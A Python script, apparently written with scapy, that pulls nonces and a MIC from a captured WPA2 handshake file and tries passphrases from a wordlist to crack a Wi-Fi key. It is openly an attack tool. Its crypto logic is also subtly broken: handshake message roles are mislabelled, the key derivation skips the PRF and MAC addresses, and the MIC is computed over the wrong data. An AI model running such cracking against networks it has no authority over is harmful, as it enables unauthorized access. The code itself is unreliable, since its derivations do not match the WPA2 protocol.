from scapy.all import *
import hashlib
import hmac
import binascii
import struct

# Define constants for WPA2 Handshake message types
MESSAGE_1 = 1  # AP -> Station
MESSAGE_2 = 2  # Station -> AP
MESSAGE_3 = 3  # AP -> Station
MESSAGE_4 = 4  # Station -> AP

# Function to extract relevant information from the .pcap/.cap file
def extract_handshake(pcap_file):
    packets = rdpcap(pcap_file)
    anonce, snonce, mic = None, None, None
    essid = None
    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_data = packet[EAPOL].load

            # Message 2: AP -> Station, contains ANonce
            if eapol_data[0] == MESSAGE_2:
                anonce = eapol_data[13:45]  # ANonce is located from byte 13 to 45
                essid = packet.info.decode()  # Extract the SSID from the packet info
                print(f"Found Message 2: ANonce = {binascii.hexlify(anonce)}")

            # Message 3: Station -> AP, contains SNonce
            elif eapol_data[0] == MESSAGE_3:
                snonce = eapol_data[13:45]  # SNonce is located from byte 13 to 45
                mic = eapol_data[45:61]  # MIC is from byte 45 to 61
                print(f"Found Message 3: SNonce = {binascii.hexlify(snonce)}, MIC = {binascii.hexlify(mic)}")
                
            # Message 4: Station -> AP, contains MIC
            elif eapol_data[0] == MESSAGE_4:
                mic_4 = eapol_data[45:61]
                print(f"Found Message 4: MIC = {binascii.hexlify(mic_4)}")
            
            # Exit once we have all required data
            if anonce and snonce and mic:
                break

    return anonce, snonce, mic, essid

# Function to derive PMK from passphrase
def derive_pmk(passphrase, ssid, anonce, snonce):
    # 4096 rounds of PBKDF2 with HMAC-SHA1
    passphrase_utf8 = passphrase.encode('utf-8')
    ssid_utf8 = ssid.encode('utf-8')
    
    pmk = hashlib.pbkdf2_hmac('sha1', passphrase_utf8, ssid_utf8, 4096, 32)
    return pmk

# Function to calculate the MIC
def calculate_mic(pmk, anonce, snonce, essid):
    # Construct the 256-bit key (K) using HMAC with the PMK, ANonce, and SNonce
    key = hmac.new(pmk, anonce + snonce, hashlib.sha1).digest()[:16]
    # HMAC with the key derived above and MIC field
    mic = hmac.new(key, anonce + snonce, hashlib.sha1).digest()
    return mic[:16]  # The MIC is 16 bytes long

# Function to perform dictionary attack
def dictionary_attack(pcap_file, dictionary_file):
    anonce, snonce, mic, essid = extract_handshake(pcap_file)
    if anonce is None or snonce is None or mic is None or essid is None:
        print("Handshake data missing in pcap file.")
        return

    # Try each passphrase from the dictionary file
    with open(dictionary_file, 'r') as f:
        for line in f:
            passphrase = line.strip()
            print(f"Trying passphrase: {passphrase}")
            
            # Derive the PMK from the passphrase
            pmk = derive_pmk(passphrase, essid, anonce, snonce)
            
            # Calculate the MIC
            derived_mic = calculate_mic(pmk, anonce, snonce, essid)
            
            # Compare the calculated MIC with the one from the handshake
            if derived_mic == mic:
                print(f"KEY FOUND! [ {passphrase} ]")
                return  # Stop once we find a match
            else:
                print("No match for this passphrase.")

    print("No key found in the dictionary.")

# Usage example
pcap_file = 'Shak.cap'  # Your pcap or cap file
dictionary_file = 'wordlist.txt'  # Your dictionary file containing potential passphrases

dictionary_attack(pcap_file, dictionary_file)
